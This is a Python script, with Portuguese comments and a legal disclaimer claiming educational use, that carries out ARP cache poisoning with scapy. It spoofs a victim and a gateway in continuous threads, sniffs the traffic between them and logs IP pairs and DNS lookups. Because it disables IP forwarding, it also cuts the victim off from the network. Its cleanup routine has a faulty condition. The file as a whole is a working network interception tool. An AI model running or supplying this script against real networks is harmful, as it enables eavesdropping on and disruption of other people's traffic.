# =====================================================================
# AVISO LEGAL:
# Este script foi desenvolvido estritamente para fins educacionais 
# e testes em ambientes controlados (laboratórios, CTFs ou sua própria rede).
# O uso indevido desta ferramenta para atacar redes de terceiros 
# sem autorização explícita é crime (Lei 12.737/2012) e de inteira 
# responsabilidade do usuário.
# =====================================================================
import threading, time

from scapy.all import ARP, send, Ether, srp, DNS, sniff
from colorama import Fore, Back, init
init(autoreset=True)

def pedir_mac(ip_vit):
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_vit, op=1)
    pacote_env, _ = srp(req, timeout=2, verbose=False)
    for envio, receb in pacote_env:
        return receb.hwsrc

def spoof_arp(ip_vitima, ip_gateway):
    mac_vit = pedir_mac(ip_vitima)
    if not mac_vit:
        return
    pacote = ARP(op=2, pdst=ip_vitima, hwdst=mac_vit, psrc=ip_gateway)
    while True:
        send(pacote, verbose=False)
        time.sleep(2)

def restaurar(vitima_inf, source):
    mac_vit = pedir_mac(vitima_inf)
    mac_g = pedir_mac(source)
    if not mac_vit and mac_g:
        return
    pkt = ARP(op=2, pdst=vitima_inf, hwdst=mac_vit, psrc=source, hwsrc=mac_g)
    for _ in range(5):
        send(pkt, verbose=False)

def filtro_cam(pacote):
    if pacote.haslayer("IP"):
        ip_dst = pacote["IP"].dst
        ip_src = pacote["IP"].src
        print(f"Alvo: {ip_src}\t\tDestino: {ip_dst}")
    if pacote.haslayer("DNS") and pacote["DNS"].qr == 0:
        dominio = pacote['DNS'].qd.qname.decode()
        print(Fore.BLUE + "[-] Dominio: " + Fore.WHITE + f"{dominio}")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser( description="Envenenamento ARP..." )
    p.add_argument("vitima", help="Digite o iup da vitima")
    p.add_argument("gateway", help="Digite o ip do gateway")
    args = p.parse_args()
    vitima, gateway = args.vitima, args.gateway
    print(Fore.RED + f"Vitima {vitima}")
    print(Fore.RED + f"Gateway {gateway}")
    
    with open("/proc/sys/net/ipv4/ip_forward", "w") as n:
        n.write("0")
        
    t1 = threading.Thread(target=spoof_arp, args=(vitima, gateway), daemon=True)
    t2 = threading.Thread(target=spoof_arp, args=(gateway, vitima), daemon=True)
    t1.start()
    t2.start()
    
    try:
        sniff( prn=filtro_cam, store=0 )
    except KeyboardInterrupt:
        print("Envenenamento ARP se desfazendo...")
        restaurar(vitima, gateway)
        restaurar(gateway, vitima)
        with open("/proc/sys/net/ipv4/ip_forward", "w") as n:
            n.write("0")
